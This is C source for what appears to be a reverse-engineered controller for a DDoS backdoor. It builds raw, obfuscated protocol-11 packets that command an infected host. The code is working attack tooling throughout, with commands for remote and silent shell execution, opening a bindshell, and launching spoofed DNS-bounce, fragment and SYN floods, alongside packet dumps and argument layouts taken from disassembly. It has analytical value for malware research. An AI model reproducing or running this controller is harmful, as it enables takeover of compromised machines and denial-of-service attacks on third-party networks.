#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <libnet.h>

// This is the protocol number, as seen in netstat -an
#define PROTO 11
// Maximum packet size
#define PACKETLEN 0x190
#define IPHEADERLEN 0x14

extern int errno;

void encrypt(unsigned char *buff, int length);

main(int argc, char *argv[])
{
	int sock;
	unsigned char *sendpacket;
	int payloadlen = 999;
	unsigned char payload[1000];
	int i, j;

	bzero(payload, PACKETLEN);

	if(argc < 2)
	{
		printf("usage: %s cmdno args\n", argv[0]);
		printf("  cmdno: 1 status\n");
		printf("         2 configure\n");
		printf("         3 execute    []\n");
		printf("         4 DNS bounce flood 1\n");
		printf("         5 frag direct flood\n");
		printf("         6 open bindshell\n");
		printf("         7 execute silent []\n");
		printf("         8 kill child\n");
		printf("         9 DNS bounce flood 2\n");
		printf("        10 SYN direct flood 1\n");
		printf("        11 SYN direct flood 2\n");
		printf("        12 DNS bounce flood 3\n");
		return(-1);
	}

	sscanf(argv[1], "%d", &i);

	for(j=0;j<payloadlen;j++)
		payload[j] = j + 0x80 + (i << 8);

	payload[0] = 2; // Packet direction, 2 = request, 3 = reply
	payload[1] = 0;

	payload[2] = 0; // cmd // command 000i
	payload[3] = i&0xff;

	if(i == 1)
	{
		// Command 1: status
		// No arguments
		// Response: ?? 01 07 00/01 XX XX
		//   ?? = *0x807E77C
		//   01 = CMD
		//   07 = ?
		//   00 = child flag, 1 = child is currently running
		//   XXXX = number of command that spawned a child
	}

	if(i == 2)
	{
		// Command 2: configuration of up to 10 response IP addresses for cmd 1,3
		// XXX
		// -8 = Source IP is read from IP header
		// +4   = type of address, 2 = single, other = list of 10
		payload[4] = 2;
		// +5-8 = dest IP 1
		payload[5] = 192;
		payload[6] = 168;
		payload[7] = 32;
		payload[8] = 254;
		// more IPs can follow, if payload[4] is set correctly
		bzero(&payload[9], PACKETLEN-9);

		// No response
	}

	if(i == 3)
	{
		// Command 3: exec with output
		// 2,3 are ignored.  4+ is command for /bin/csh
		if(argc < 3)
			strcpy(&payload[4], "touch /tmp/IRan.$$");
		else
			strcpy(&payload[4], argv[2]);
	}

	if(i == 4)
	{
		// DNS response/RST/ICMP_unreach flood target (IP or %1.virtual.org)

		// Args are passed to L08049174
		payload[0+4] = 192;  // L08049174 arg 1 forged source if flag == 0 line 1550
		payload[1+4] = 168;  // L08049174 arg 2 forged source if flag == 0 line 1550
		payload[2+4] = 32;   // L08049174 arg 3 forged source if flag == 0 line 1550
		payload[3+4] = 128;  // L08049174 arg 4 forged source if flag == 0 line 1550
		payload[4+4] = 2;    // L08049174 arg 5 forged source Port High line 1533
		payload[5+4] = 154;  // L08049174 arg 6 forged source Port Low line 1533
		payload[6+4] = 1;    // L08049174 arg 7 flag line 1490
		                     //     0 = use above IP address as source address
		                     //     1 = lookup below name as %1.virtual.org and use
		                     //         IP as source address.
		payload[7+4]  = 'w'; // L08049174 arg 8 raw data
		payload[8+4]  = 'o'; // L08049174 arg 8 raw data
		payload[9+4]  = 'r'; // L08049174 arg 8 raw data
		payload[10+4] = 'd'; // L08049174 arg 8 raw data
		payload[11+4] = 'u'; // L08049174 arg 8 raw data
		payload[12+4] = 'p'; // L08049174 arg 8 raw data
		payload[13+4] =  0;  // L08049174 arg 8 raw data
	}

	if(i == 5)
	{
		// Spoofed fragment packet flood
		// ICMP or UDP (with dest port selection)

//04:44:45.306080 < 192.168.33.96 > 192.168.33.64: (frag 1109:9@65520) [tos 0x5c]  (ttl 224)
//                         455c 001d 0455 1ffe e011 f22f c0a8 2160
//                         c0a8 2140 00a9 00bd 0009 121a 61

		payload[0+4] = 0;     // L080499F4 arg 1  // toggle 0,1
		                      // 0 = ICMP flood,body 0800 9814 7374 7576 77
		                      // 1 = UDP flood,body 00a9 00bd 0009 121a 61
		payload[1+4] = 0xbd;  // L080499F4 arg 2  // 0x11 arg 1
		payload[2+4] = 192;   // L080499F4 arg 3  // Dest Address
		payload[3+4] = 168;   // L080499F4 arg 4
		payload[4+4] = 33;    // L080499F4 arg 5
		payload[5+4] = 64;    // L080499F4 arg 6
		payload[6+4] = 192;   // L080499F4 arg 7  // forged Source Address
		payload[7+4] = 168;   // L080499F4 arg 8
		payload[8+4] = 33;    // L080499F4 arg 9
		payload[9+4] = 96;    // L080499F4 arg 10
		payload[10+4] = 1;    // L080499F4 arg 11  // toggle 0,1
		                      //     0 = use above IP address as destination address
		                      //     1 = lookup below name as %1.virtual.org and use
		                      //         IP as destination address.
		payload[11+4] = 'w';  // L080499F4 arg 12 raw data
		payload[12+4] = 'o';  // L080499F4 arg 12 raw data
		payload[13+4] = 'r';  // L080499F4 arg 12 raw data
		payload[14+4] = 'd';  // L080499F4 arg 12 raw data
		payload[15+4] = 'u';  // L080499F4 arg 12 raw data
		payload[16+4] = 'p';  // L080499F4 arg 12 raw data
		payload[17+4] =   0;  // L080499F4 arg 12 raw data
	}

	if(i == 6)
	{
		// Command 6: Open bindshell
		// no args, no response
	}

	if(i == 7)
	{
		// Command 7: silent exec
		// 2,3 are ignored.  4+ is command for /bin/csh
		if(argc < 3)
			strcpy(&payload[4], "touch /tmp/IRanSilently.$$");
		else
			strcpy(&payload[4], argv[2]);
	}

	if(i == 8)
	{
		// Command 8: Kill child PID
		// No args, no result
	}

	if(i == 9)
	{
		// DNS response/RST/ICMP_unreach flood target (IP or %1.virtual.org)
		// Has one more switch/counter argument than cmd 04 XXX

		// Args are passed to L08049174
		payload[0+4] = 192;  // L08049174 arg 1 forged source if flag == 0 line 1550
		payload[1+4] = 168;  // L08049174 arg 2 forged source if flag == 0 line 1550
		payload[2+4] = 32;   // L08049174 arg 3 forged source if flag == 0 line 1550
		payload[3+4] = 128;  // L08049174 arg 4 forged source if flag == 0 line 1550
		payload[4+4] = 2;    // counter 2->255 line 1592 XXX UNKNOWN
		payload[5+4] = 2;    // L08049174 arg 6 forged source Port High line 1533
		payload[6+4] = 154;  // L08049174 arg 5 forged source Port Low line 1533
		payload[7+4] = 1;    // L08049174 arg 7 flag line 1490
		                     //     0 = use above IP address as source address
		                     //     1 = lookup below name as %1.virtual.org and use
		                     //         IP as source address.
		payload[8+4]  = 'w'; // L08049174 arg 8 raw data
		payload[9+4]  = 'o'; // L08049174 arg 8 raw data
		payload[10+4] = 'r'; // L08049174 arg 8 raw data
		payload[11+4] = 'd'; // L08049174 arg 8 raw data
		payload[12+4] = 'u'; // L08049174 arg 8 raw data
		payload[13+4] = 'p'; // L08049174 arg 8 raw data
		payload[14+4] =  0;  // L08049174 arg 8 raw data
	}

	if(i == 10)
	{
		// TCP SYN flood target on desired port
		// random: source port, seq number, window, ttl, id

//05:58:14.527436 < 184.77.213.245.3944 > 192.168.32.128.666: S 16479582:16479582(0) win 1518 (ttl 238, id 3542)
//                         4500 0028 0dd6 0000 ee06 4f8e b84d d5f5
//                         c0a8 2080 0f68 029a 00fb 755e 0000 0000
//                         5002 05ee b22d 0000

		// Args are passed to L08049D40
		payload[0+4] = 192;  // L08049D40 arg 1 dest address line 2217
		payload[1+4] = 168;  // L08049D40 arg 2
		payload[2+4] = 32;   // L08049D40 arg 3
		payload[3+4] = 128;  // L08049D40 arg 4
		payload[4+4] = 2;    // L08049D40 arg 5 dest port high
		payload[5+4] = 154;  // L08049D40 arg 6 dest port low
		payload[6+4] = 0;    // L08049D40 arg 7 flag line 2228
		                     // 0 = use random source address
		                     // 1 = use IP address from below as source
		payload[7+4] = 192;  // L08049D40 arg 8 source address line 2229
		payload[8+4] = 168;  // L08049D40 arg 9
		payload[9+4] = 32;   // L08049D40 arg 10
		payload[10+4] = 140; // L08049D40 arg 11
		                     // arg 12 = 0
		payload[11+4] = 1;   // L08049D40 arg 13 flag line 2231
		                     //     0 = use above IP address as destination address
		                     //     1 = lookup below name as %1.virtual.org and use
		                     //         IP as destination address.
		payload[12+4] = 'w'; // L08049D40 arg 14 raw data line 2232
		payload[13+4] = 'o'; // L08049D40 arg 14 raw data
		payload[14+4] = 'r'; // L08049D40 arg 14 raw data
		payload[15+4] = 'd'; // L08049D40 arg 14 raw data
		payload[16+4] = 'u'; // L08049D40 arg 14 raw data
		payload[17+4] = 'p'; // L08049D40 arg 14 raw data
		payload[18+4] =  0;  // L08049D40 arg 14 raw data
	}

	if(i == 11)
	{
		// TCP SYN flood target on desired port
		// random: source port, seq number, window, ttl, id

//05:58:14.527436 < 184.77.213.245.3944 > 192.168.32.128.666: S 16479582:16479582(0) win 1518 (ttl 238, id 3542)
//                         4500 0028 0dd6 0000 ee06 4f8e b84d d5f5
//                         c0a8 2080 0f68 029a 00fb 755e 0000 0000
//                         5002 05ee b22d 0000

		// Args are passed to L08049D40
		payload[0+4] = 192;  // L08049D40 arg 1 dest address line 2217
		payload[1+4] = 168;  // L08049D40 arg 2
		payload[2+4] = 32;   // L08049D40 arg 3
		payload[3+4] = 128;  // L08049D40 arg 4
		payload[4+4] = 2;    // L08049D40 arg 5 dest port high
		payload[5+4] = 154;  // L08049D40 arg 6 dest port low
		payload[6+4] = 0;    // L08049D40 arg 7 flag line 2228
		                     // 0 = use random source address
		                     // 1 = use IP address from below as source
		payload[7+4] = 192;  // L08049D40 arg 8 source address line 2229
		payload[8+4] = 168;  // L08049D40 arg 9
		payload[9+4] = 32;   // L08049D40 arg 10
		payload[10+4] = 140; // L08049D40 arg 11
		payload[11+4] = 4;   // L08049D40 arg 12 counter, line 2200, 2371 XXX
		payload[12+4] = 1;   // L08049D40 arg 13 flag line 2231
		                     //     0 = use above IP address as destination address
		                     //     1 = lookup below name as %1.virtual.org and use
		                     //         IP as destination address.
		payload[13+4] = 'w'; // L08049D40 arg 14 raw data line 2232
		payload[14+4] = 'o'; // L08049D40 arg 14 raw data
		payload[15+4] = 'r'; // L08049D40 arg 14 raw data
		payload[16+4] = 'd'; // L08049D40 arg 14 raw data
		payload[17+4] = 'u'; // L08049D40 arg 14 raw data
		payload[18+4] = 'p'; // L08049D40 arg 14 raw data
		payload[19+4] =  0;  // L08049D40 arg 14 raw data
	}

	if(i == 12)
	{
		// DNS bounce attack, queries SOA of com, org, net, edu, usc.edu from destination DNS
		// sends some other DNS packets, unknown purpose?
		// random: ttl, ID

		// Args are passed to L08049564
		payload[0+4] = 192;  // L08049564 arg 1 destination address line 1738
		payload[1+4] = 168;  // L08049564 arg 2
		payload[2+4] = 32;   // L08049564 arg 3
		payload[3+4] = 128;  // L08049564 arg 4
		payload[4+4] = 192;  // L08049564 arg 5 source address line 1802
		payload[5+4] = 168;  // L08049564 arg 6
		payload[6+4] = 32;   // L08049564 arg 7
		payload[7+4] = 129;  // L08049564 arg 8
		payload[8+4] = 0;    // L08049564 arg 9 count line 1740
		payload[9+4] = 2;    // L08049564 arg 10 source port high
		payload[10+4] = 154; // L08049564 arg 11 source port low
		payload[11+4] = 1;   // L08049564 arg 12 hostname flag line 1752
		                     // 0 = use above destination address
		                     // 1 = resolve below name and use as destination address
		payload[12+4] = 'w'; // L08049564 arg 13 raw data line 1753
		payload[13+4] = 'o'; // L08049564 arg 13 raw data
		payload[14+4] = 'r'; // L08049564 arg 13 raw data
		payload[15+4] = 'd'; // L08049564 arg 13 raw data
		payload[16+4] = 'u'; // L08049564 arg 13 raw data
		payload[17+4] = 'p'; // L08049564 arg 13 raw data
		payload[18+4] =  0;  // L08049564 arg 13 raw data
	}

	encrypt(&payload[2], payloadlen-2);

	sock = libnet_open_raw_sock(PROTO);
	if(sock > 0)
	{
		FILE *fp;
		u_long saddr = libnet_name_resolve("192.168.32.254", 1);
		u_long daddr = libnet_name_resolve("192.168.32.200", 1);

		libnet_init_packet(1000, &sendpacket);

		libnet_build_ip(
			payloadlen, 
			0,      // TOS
			rand(), // ID
			0,      // Frag
			0xfa,   // TTL
			PROTO,  // Protocol
			saddr,	// Source Address
			daddr,	// Destination Address
			payload, payloadlen, sendpacket);

		printf("Sending %x bytes\n", 0xff);
		libnet_write_ip(sock, sendpacket, 0x12f);
		//fp = fopen("packet.dmp", "w");
		//libnet_hex_dump(sendpacket, payloadlen, 1, fp);
		//fclose(fp);

		libnet_destroy_packet(&sendpacket);

		libnet_close_raw_sock(sock);
	}
	else
	{
		fprintf(stderr, "Failed to open raw socket\n");
	}
}

void encrypt(unsigned char *buff, int length)
{
	int pos;

	buff[0] += 0x17;

	for(pos=1;pos<length;pos++)
		buff[pos] += buff[pos-1] + 0x17;
}

